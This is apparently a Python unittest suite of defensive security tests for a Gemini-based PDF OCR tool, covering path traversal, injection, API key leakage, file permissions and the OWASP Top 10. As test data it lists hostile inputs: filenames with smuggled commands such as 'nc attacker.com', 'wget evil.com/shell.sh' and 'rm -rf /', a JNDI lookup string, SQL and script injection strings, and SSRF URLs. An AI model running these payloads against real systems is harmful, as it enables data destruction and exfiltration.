#!/usr/bin/env python3
"""
Comprehensive Security Tests for PDF OCR Processing Tool

Tests for critical security vulnerabilities:
1. Path traversal vulnerabilities
2. Input injection attacks  
3. API key exposure in logs/errors
4. Unsafe file operations
5. OWASP Top 10 relevant issues

Author: Security Team
Version: 1.0.0
"""

import unittest
import os
import tempfile
import shutil
import logging
from pathlib import Path
from unittest.mock import patch, MagicMock, mock_open
import sys
import io

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

# Mock external dependencies
sys.modules['google.generativeai'] = MagicMock()
sys.modules['pymupdf'] = MagicMock()
sys.modules['PIL.Image'] = MagicMock()
sys.modules['gradio'] = MagicMock()

import pdf_ocr
import utils
import config
try:
    import gradio_app
except ImportError:
    gradio_app = MagicMock()


class TestPathTraversalVulnerabilities(unittest.TestCase):
    """Test path traversal attack protection"""
    
    def setUp(self):
        """Set up test environment"""
        self.test_dir = tempfile.mkdtemp()
        self.safe_dir = os.path.join(self.test_dir, "safe")
        self.restricted_dir = os.path.join(self.test_dir, "restricted")
        os.makedirs(self.safe_dir)
        os.makedirs(self.restricted_dir)
        
        # Create test files
        self.safe_file = os.path.join(self.safe_dir, "safe.txt")
        self.restricted_file = os.path.join(self.restricted_dir, "secret.txt")
        
        with open(self.safe_file, 'w') as f:
            f.write("Safe content")
        with open(self.restricted_file, 'w') as f:
            f.write("Restricted content")
    
    def tearDown(self):
        """Clean up test environment"""
        shutil.rmtree(self.test_dir, ignore_errors=True)
    
    def test_path_traversal_in_safe_file_read(self):
        """Test path traversal protection in utils.safe_file_read"""
        # Attempt to read file outside base directory using ../
        malicious_path = os.path.join(self.safe_dir, "..", "restricted", "secret.txt")
        
        result = utils.safe_file_read(malicious_path, base_dir=self.safe_dir)
        
        # Should be blocked by path traversal protection
        self.assertIsNone(result)
    
    def test_absolute_path_traversal_attack(self):
        """Test protection against absolute path attacks"""
        # Try to access file using absolute path outside base directory
        result = utils.safe_file_read(self.restricted_file, base_dir=self.safe_dir)
        
        # Should be blocked
        self.assertIsNone(result)
    
    def test_pdf_ocr_output_path_validation(self):
        """Test path traversal protection in PDF OCR output saving"""
        ocr = pdf_ocr.GeminiPDFOCR(
            api_key="test_key",
            output_folder=self.safe_dir
        )
        
        # Attempt path traversal in output filename
        malicious_output = os.path.join(self.safe_dir, "..", "restricted", "malicious.md")
        
        with self.assertRaises(ValueError) as context:
            ocr._save_to_file(["test content"], malicious_output)
        
        self.assertIn("path traversal detected", str(context.exception))
    
    def test_symlink_path_traversal(self):
        """Test protection against symlink-based path traversal"""
        # Create symlink pointing outside safe directory
        symlink_path = os.path.join(self.safe_dir, "symlink_attack")
        try:
            os.symlink(self.restricted_file, symlink_path)
            
            result = utils.safe_file_read(symlink_path, base_dir=self.safe_dir)
            
            # Should be blocked (symlink points outside base_dir)
            self.assertIsNone(result)
        except OSError:
            # Symlinks may not be supported on all systems
            self.skipTest("Symlinks not supported on this system")
    
    def test_double_encoded_path_traversal(self):
        """Test protection against double-encoded path traversal"""
        # URL-encoded ../ sequences
        encoded_path = os.path.join(self.safe_dir, "%2e%2e", "restricted", "secret.txt")
        
        result = utils.safe_file_read(encoded_path, base_dir=self.safe_dir)
        
        # Should be blocked
        self.assertIsNone(result)
    
    def test_null_byte_injection(self):
        """Test protection against null byte injection attacks"""
        # Null byte to truncate path validation
        null_byte_path = self.safe_file + "\x00" + "../restricted/secret.txt"
        
        result = utils.safe_file_read(null_byte_path, base_dir=self.safe_dir)
        
        # Should be blocked or handled safely
        self.assertIsNone(result)


class TestInputInjectionAttacks(unittest.TestCase):
    """Test input injection attack protection"""
    
    def setUp(self):
        """Set up test environment"""
        self.test_dir = tempfile.mkdtemp()
    
    def tearDown(self):
        """Clean up test environment"""
        shutil.rmtree(self.test_dir, ignore_errors=True)
    
    def test_command_injection_in_filenames(self):
        """Test protection against command injection in filenames"""
        # Malicious filename with command injection
        malicious_filenames = [
            "test.pdf; rm -rf /",
            "test.pdf && cat /etc/passwd",
            "test.pdf | nc attacker.com 1337",
            "test.pdf`whoami`",
            "test.pdf$(id)",
            "test.pdf;wget evil.com/shell.sh"
        ]
        
        ocr = pdf_ocr.GeminiPDFOCR(
            api_key="test_key",
            input_folder=self.test_dir,
            output_folder=self.test_dir
        )
        
        for malicious_name in malicious_filenames:
            with self.subTest(filename=malicious_name):
                # Should not execute commands - just fail safely
                try:
                    ocr.process_pdf(malicious_name, verbose=False)
                except FileNotFoundError:
                    # Expected - file doesn't exist
                    pass
                except Exception as e:
                    # Should not contain evidence of command execution
                    error_msg = str(e).lower()
                    dangerous_outputs = ['root', 'uid=', 'gid=', '/bin/', '/etc/passwd']
                    for dangerous in dangerous_outputs:
                        self.assertNotIn(dangerous, error_msg)
    
    def test_script_injection_in_custom_prompts(self):
        """Test protection against script injection in custom prompts"""
        malicious_prompts = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "${jndi:ldap://evil.com/exploit}",
            "{{7*7}}",  # Template injection
            "<%=system('id')%>",  # Code injection
            "\"; os.system('rm -rf /'); \"",
            "eval(compile('__import__(\"os\").system(\"id\")', '<string>', 'exec'))"
        ]
        
        # Mock OCR to capture prompts
        mock_model = MagicMock()
        mock_response = MagicMock()
        mock_response.text = "Safe extracted text"
        mock_model.generate_content.return_value = mock_response
        
        ocr = pdf_ocr.GeminiPDFOCR(api_key="test_key")
        ocr._model = mock_model
        
        test_image = os.path.join(self.test_dir, "test.png")
        with open(test_image, 'wb') as f:
            f.write(b'fake_image_data')
        
        for malicious_prompt in malicious_prompts:
            with self.subTest(prompt=malicious_prompt):
                # Should sanitize or safely handle malicious prompts
                result = ocr.extract_text_from_image(test_image, malicious_prompt)
                
                # Verify no code execution occurred
                self.assertEqual(result, "Safe extracted text")
                
                # Check that prompt was passed to API (not executed locally)
                mock_model.generate_content.assert_called()
    
    def test_path_injection_in_folder_names(self):
        """Test protection against path injection in folder configuration"""
        malicious_folders = [
            "../../../etc",
            "/etc/passwd",
            "folder; rm -rf /",
            "folder`whoami`",
            "folder$(id)",
            "folder\x00/etc/passwd"
        ]
        
        for malicious_folder in malicious_folders:
            with self.subTest(folder=malicious_folder):
                # Should validate folder names in config
                with self.assertRaises(ValueError):
                    # Mock environment with malicious folder
                    with patch.dict(os.environ, {'INPUT_FOLDER': malicious_folder}):
                        import importlib
                        importlib.reload(config)
                        config.validate_config()
    
    def test_log_injection_attacks(self):
        """Test protection against log injection attacks"""
        # Malicious input designed to inject fake log entries
        malicious_inputs = [
            "Normal input\n2023-01-01 - ERROR - Fake error injected",
            "Input\r\n[CRITICAL] System compromised",
            "Test\x0a\x0d2023-01-01 - INFO - Admin logged in",
            "Input\u2028[ERROR] Injection attempt"
        ]
        
        # Capture log output
        log_stream = io.StringIO()
        handler = logging.StreamHandler(log_stream)
        logger = logging.getLogger('test_logger')
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
        
        for malicious_input in malicious_inputs:
            with self.subTest(input=malicious_input):
                # Sanitize input before logging
                sanitized = utils.validate_input(malicious_input)
                logger.info(f"Processing input: {sanitized}")
                
                log_output = log_stream.getvalue()
                
                # Should not contain injected log entries
                self.assertNotIn("Fake error injected", log_output)
                self.assertNotIn("System compromised", log_output)
                self.assertNotIn("Admin logged in", log_output)
                
                log_stream.truncate(0)
                log_stream.seek(0)


class TestAPIKeyExposure(unittest.TestCase):
    """Test API key exposure in logs, errors, and other outputs"""
    
    def setUp(self):
        """Set up test environment"""
        self.test_api_key = "AIzaSyBxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
        self.log_stream = io.StringIO()
        
        # Setup test logger
        self.logger = logging.getLogger('test_security')
        self.handler = logging.StreamHandler(self.log_stream)
        self.logger.addHandler(self.handler)
        self.logger.setLevel(logging.DEBUG)
    
    def tearDown(self):
        """Clean up test environment"""
        self.logger.removeHandler(self.handler)
    
    def test_api_key_not_in_logs(self):
        """Test that API keys are not logged"""
        ocr = pdf_ocr.GeminiPDFOCR(api_key=self.test_api_key)
        
        # Get all log output
        log_output = self.log_stream.getvalue()
        
        # API key should not appear in logs
        self.assertNotIn(self.test_api_key, log_output)
        self.assertNotIn("AIzaSyB", log_output)  # Partial key
    
    def test_api_key_not_in_error_messages(self):
        """Test that API keys don't appear in error messages"""
        # Force an error during OCR initialization
        with patch('google.generativeai.configure', side_effect=Exception("API Error")):
            try:
                ocr = pdf_ocr.GeminiPDFOCR(api_key=self.test_api_key)
                # Force model access to trigger error
                _ = ocr.model
            except Exception as e:
                error_msg = str(e)
                # API key should not be in error message
                self.assertNotIn(self.test_api_key, error_msg)
    
    def test_api_key_not_in_debug_output(self):
        """Test that API keys don't appear in debug output"""
        # Enable debug logging
        self.logger.setLevel(logging.DEBUG)
        
        ocr = pdf_ocr.GeminiPDFOCR(api_key=self.test_api_key)
        
        # Access model to trigger debug logging
        try:
            _ = ocr.model
        except:
            pass
        
        debug_output = self.log_stream.getvalue()
        
        # API key should not appear in debug output
        self.assertNotIn(self.test_api_key, debug_output)
    
    def test_api_key_not_in_exception_traceback(self):
        """Test that API keys don't appear in exception tracebacks"""
        import traceback
        
        try:
            # Force an exception that might include API key
            ocr = pdf_ocr.GeminiPDFOCR(api_key=self.test_api_key)
            with patch.object(ocr, 'model', side_effect=Exception("Model error")):
                ocr.extract_text_from_image("nonexistent.png")
        except Exception:
            tb_str = traceback.format_exc()
            # API key should not be in traceback
            self.assertNotIn(self.test_api_key, tb_str)
    
    def test_api_key_not_in_repr_or_str(self):
        """Test that API keys don't appear in object representations"""
        ocr = pdf_ocr.GeminiPDFOCR(api_key=self.test_api_key)
        
        # Check string representations
        str_repr = str(ocr.__dict__)
        repr_repr = repr(ocr.__dict__)
        
        # API key should not be exposed in object representations
        self.assertNotIn(self.test_api_key, str_repr)
        self.assertNotIn(self.test_api_key, repr_repr)
    
    def test_config_validation_error_no_key_exposure(self):
        """Test that config validation errors don't expose API keys"""
        # Test with invalid API key
        with patch.dict(os.environ, {'GEMINI_API_KEY': self.test_api_key}):
            try:
                import importlib
                importlib.reload(config)
                # Force validation with short key to trigger error
                with patch.object(config, 'GEMINI_API_KEY', 'short'):
                    config.validate_config()
            except ValueError as e:
                error_msg = str(e)
                # Should not contain actual API key
                self.assertNotIn(self.test_api_key, error_msg)


class TestUnsafeFileOperations(unittest.TestCase):
    """Test unsafe file operation protection"""
    
    def setUp(self):
        """Set up test environment"""
        self.test_dir = tempfile.mkdtemp()
        self.safe_dir = os.path.join(self.test_dir, "safe")
        os.makedirs(self.safe_dir)
    
    def tearDown(self):
        """Clean up test environment"""
        shutil.rmtree(self.test_dir, ignore_errors=True)
    
    def test_temp_file_creation_security(self):
        """Test secure temporary file creation"""
        # Test that temp files are created with secure permissions
        temp_file = utils.create_temp_file("sensitive content", ".txt")
        
        if temp_file:
            # Check file permissions (should not be world-readable)
            file_stat = os.stat(temp_file)
            file_mode = file_stat.st_mode
            
            # Should not be world-readable (no 004 bit)
            self.assertEqual(file_mode & 0o004, 0)
            
            # Clean up
            os.unlink(temp_file)
    
    def test_directory_creation_permissions(self):
        """Test secure directory creation permissions"""
        ocr = pdf_ocr.GeminiPDFOCR(
            api_key="test_key",
            input_folder=os.path.join(self.test_dir, "input"),
            output_folder=os.path.join(self.test_dir, "output")
        )
        
        # Check directory permissions
        input_stat = os.stat(ocr.input_folder)
        output_stat = os.stat(ocr.output_folder)
        
        # Should have secure permissions (755 or similar)
        expected_mode = 0o755
        self.assertEqual(input_stat.st_mode & 0o777, expected_mode)
        self.assertEqual(output_stat.st_mode & 0o777, expected_mode)
    
    def test_file_overwrite_protection(self):
        """Test protection against accidental file overwrites"""
        # Create existing file
        existing_file = os.path.join(self.safe_dir, "existing.md")
        with open(existing_file, 'w') as f:
            f.write("Important existing content")
        
        ocr = pdf_ocr.GeminiPDFOCR(
            api_key="test_key",
            output_folder=self.safe_dir
        )
        
        # Should handle existing files appropriately
        ocr._save_to_file(["New content"], existing_file)
        
        # File should be overwritten (this is expected behavior)
        with open(existing_file, 'r') as f:
            content = f.read()
            self.assertIn("New content", content)
    
    def test_race_condition_in_temp_file_creation(self):
        """Test protection against race conditions in temp file creation"""
        import threading
        import time
        
        created_files = []
        errors = []
        
        def create_temp_file_worker():
            try:
                temp_file = utils.create_temp_file("test content", ".txt")
                if temp_file:
                    created_files.append(temp_file)
            except Exception as e:
                errors.append(str(e))
        
        # Create multiple threads to test race conditions
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=create_temp_file_worker)
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join()
        
        # Should not have race condition errors
        self.assertEqual(len(errors), 0)
        
        # All files should be unique
        self.assertEqual(len(created_files), len(set(created_files)))
        
        # Clean up
        for temp_file in created_files:
            try:
                os.unlink(temp_file)
            except:
                pass
    
    def test_symbolic_link_handling(self):
        """Test safe handling of symbolic links"""
        # Create a symbolic link
        target_file = os.path.join(self.safe_dir, "target.txt")
        symlink_file = os.path.join(self.safe_dir, "symlink.txt")
        
        with open(target_file, 'w') as f:
            f.write("Target content")
        
        try:
            os.symlink(target_file, symlink_file)
            
            # Should handle symlinks safely
            result = utils.safe_file_read(symlink_file, base_dir=self.safe_dir)
            
            # Should read through symlink if within base directory
            self.assertEqual(result, "Target content")
            
        except OSError:
            # Symlinks may not be supported
            self.skipTest("Symlinks not supported on this system")


class TestOWASPTop10Vulnerabilities(unittest.TestCase):
    """Test OWASP Top 10 vulnerabilities relevant to this application"""
    
    def test_a01_broken_access_control(self):
        """Test A01: Broken Access Control"""
        # Test path traversal (covered above)
        # Test unauthorized file access
        test_dir = tempfile.mkdtemp()
        try:
            restricted_file = os.path.join(test_dir, "restricted.txt")
            with open(restricted_file, 'w') as f:
                f.write("Restricted content")
            
            # Should not be able to access files outside allowed directories
            result = utils.safe_file_read(restricted_file, base_dir="/nonexistent")
            self.assertIsNone(result)
        finally:
            shutil.rmtree(test_dir, ignore_errors=True)
    
    def test_a02_cryptographic_failures(self):
        """Test A02: Cryptographic Failures"""
        # Test that hashing uses secure algorithms
        test_data = "sensitive data"
        hash_result = utils.generate_hash(test_data)
        
        # Should use SHA-256 (64 character hex string)
        self.assertEqual(len(hash_result), 64)
        self.assertTrue(all(c in '0123456789abcdef' for c in hash_result))
        
        # Should be deterministic
        hash_result2 = utils.generate_hash(test_data)
        self.assertEqual(hash_result, hash_result2)
    
    def test_a03_injection(self):
        """Test A03: Injection (covered in input injection tests above)"""
        # Additional test for SQL-like injection patterns
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/*",
            "' UNION SELECT * FROM secrets --"
        ]
        
        for malicious_input in malicious_inputs:
            # Should sanitize input
            sanitized = utils.validate_input(malicious_input)
            
            # Should remove dangerous characters
            self.assertNotIn("'", sanitized)
            self.assertNotIn(";", sanitized)
            self.assertNotIn("--", sanitized)
    
    def test_a04_insecure_design(self):
        """Test A04: Insecure Design"""
        # Test that sensitive operations require proper validation
        ocr = pdf_ocr.GeminiPDFOCR(api_key="test_key")
        
        # Should validate API key before use
        self.assertIsNotNone(ocr.api_key)
        self.assertTrue(len(ocr.api_key) > 0)
    
    def test_a05_security_misconfiguration(self):
        """Test A05: Security Misconfiguration"""
        # Test that default configurations are secure
        
        # Test file permissions
        test_dir = tempfile.mkdtemp()
        try:
            ocr = pdf_ocr.GeminiPDFOCR(
                api_key="test_key",
                input_folder=os.path.join(test_dir, "input"),
                output_folder=os.path.join(test_dir, "output")
            )
            
            # Directories should have secure permissions
            input_stat = os.stat(ocr.input_folder)
            self.assertEqual(input_stat.st_mode & 0o777, 0o755)
            
        finally:
            shutil.rmtree(test_dir, ignore_errors=True)
    
    def test_a06_vulnerable_components(self):
        """Test A06: Vulnerable and Outdated Components"""
        # Test that we're using secure versions of dependencies
        # This would typically be done with dependency scanning tools
        
        # Test that we handle dependency failures gracefully
        with patch('builtins.__import__', side_effect=ImportError("Module not found")):
            # Should handle missing dependencies gracefully
            try:
                import pdf_ocr
                # Should have fallback behavior
                self.assertTrue(True)  # If we get here, fallback worked
            except ImportError:
                # Should not crash the entire application
                pass
    
    def test_a07_identification_authentication_failures(self):
        """Test A07: Identification and Authentication Failures"""
        # Test API key validation
        
        # Should reject empty API keys
        with self.assertRaises(ValueError):
            pdf_ocr.GeminiPDFOCR(api_key="")
        
        # Should reject None API keys
        with self.assertRaises(ValueError):
            pdf_ocr.GeminiPDFOCR(api_key=None)
    
    def test_a08_software_data_integrity_failures(self):
        """Test A08: Software and Data Integrity Failures"""
        # Test that file integrity is maintained
        test_dir = tempfile.mkdtemp()
        try:
            test_content = "Test content for integrity check"
            
            # Create and read file
            temp_file = utils.create_temp_file(test_content, ".txt")
            if temp_file:
                read_content = utils.safe_file_read(temp_file)
                
                # Content should match exactly
                self.assertEqual(test_content, read_content)
                
                os.unlink(temp_file)
        finally:
            shutil.rmtree(test_dir, ignore_errors=True)
    
    def test_a09_security_logging_monitoring_failures(self):
        """Test A09: Security Logging and Monitoring Failures"""
        # Test that security events are logged appropriately
        log_stream = io.StringIO()
        handler = logging.StreamHandler(log_stream)
        logger = logging.getLogger('security_test')
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
        
        # Simulate security event
        try:
            utils.safe_file_read("../../../etc/passwd", base_dir="/safe")
        except:
            pass
        
        # Should log security-relevant events
        log_output = log_stream.getvalue()
        # Note: Current implementation may not log all security events
        # This test documents the expected behavior
    
    def test_a10_server_side_request_forgery(self):
        """Test A10: Server-Side Request Forgery (SSRF)"""
        # Not directly applicable to this application as it doesn't make
        # user-controlled HTTP requests, but test URL handling if any
        
        # Test that file paths can't be used to make network requests
        malicious_urls = [
            "http://evil.com/malicious",
            "ftp://attacker.com/data",
            "file:///etc/passwd",
            "gopher://evil.com:1337"
        ]
        
        for malicious_url in malicious_urls:
            # Should not process URLs as file paths
            result = utils.safe_file_read(malicious_url)
            self.assertIsNone(result)


if __name__ == '__main__':
    unittest.main(verbosity=2)